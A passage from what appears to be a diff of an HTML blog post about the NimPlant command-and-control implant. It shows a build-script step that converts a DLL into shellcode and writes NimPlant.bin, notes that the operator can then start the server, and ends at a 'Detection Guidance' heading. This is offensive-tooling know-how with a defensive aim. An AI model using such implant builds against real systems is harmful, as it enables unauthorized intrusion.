+        shellcode <span style=color:#f92672>=</span> ConvertToShellcode<span style=color:#f92672>(</span>dll, HashFunctionName<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;Update&#39;</span><span style=color:#f92672>)</span>, flags<span style=color:#f92672>=</span>0x5<span style=color:#f92672>)</span>
+        with open<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;client/bin/NimPlant.bin&#34;</span>, <span style=color:#e6db74>&#34;wb&#34;</span><span style=color:#f92672>)</span> as f:
+            f.write<span style=color:#f92672>(</span>shellcode<span style=color:#f92672>)</span>
 
-    <span style=color:#6ab825;font-weight:700>else</span>:
-        print(<span style=color:#ed9d13>&#34;ERROR: Unrecognized compile type.&#34;</span>)
+    <span style=color:#66d9ef>else</span>:
+        print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;ERROR: Unrecognized compile type.&#34;</span><span style=color:#f92672>)</span>
 </code></pre></div><p>If the user has prepared the binaries that they want, they are ready to start the server. Of course, the same script offers a convenient <code>server</code> flag to launch the server, which will use the same <code>config.toml</code> used to generate the Nimplant files. The operator is now ready for action!</p>
 <p><img src=/images/nimplant-console.png alt="Nimplant Console"></p>
 <h2 id=detection-guidance>Detection Guidance</h2>
